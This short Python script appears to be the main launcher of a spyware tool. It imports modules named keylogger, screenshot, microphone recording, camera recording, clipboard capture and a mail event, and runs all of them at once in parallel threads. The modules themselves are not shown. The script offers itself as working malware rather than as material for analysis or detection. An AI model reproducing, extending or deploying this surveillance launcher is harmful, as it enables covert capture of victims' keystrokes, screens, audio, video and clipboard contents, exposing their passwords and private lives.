from keylogger import keylogger
from screenshot import screenshot
import threading
from mic_record import mic_record
from cam import cam_record
from mail_event import mail_event
from clipboard_event import clipboard_event

if __name__ =="__main__":
    # creating thread
    t1 = threading.Thread(target=screenshot)
    t2 = threading.Thread(target=keylogger)
    t3 = threading.Thread(target=mic_record)
    t4 = threading.Thread(target=cam_record)
    t5 = threading.Thread(target=mail_event)
    t6 = threading.Thread(target=clipboard_event)
 
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
 
    t1.join()
    t2.join()
    t3.join()
    t4.join()
    t5.join()
    t6.join()

    print("Done!")